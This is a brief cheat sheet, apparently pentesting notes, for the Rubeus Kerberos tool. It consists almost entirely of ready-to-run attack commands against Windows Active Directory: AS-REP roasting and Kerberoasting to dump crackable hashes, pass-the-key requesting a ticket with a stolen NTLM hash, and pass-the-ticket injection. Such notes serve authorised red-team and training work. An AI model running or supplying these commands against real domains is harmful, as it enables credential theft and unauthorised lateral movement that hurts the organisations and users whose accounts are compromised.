# Source

- https://github.com/GhostPack/Rubeus

Review the opsec notes before compiling the program in visual studio. 

## ASREProasting:

chek for users in the current domain:

- Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>

## Kerberoasting:

- Rubeus.exe kerberoast /outfile:<output_TGSs_file>

- Rubeus.exe kerberoast /outfile:hashes.txt [/spn:"SID-VALUE"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] 

## Pass the key (PTK):

- .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt


## Using the ticket on a Windows target: 

- Rubeus.exe ptt /ticket:<ticket_kirbi_file>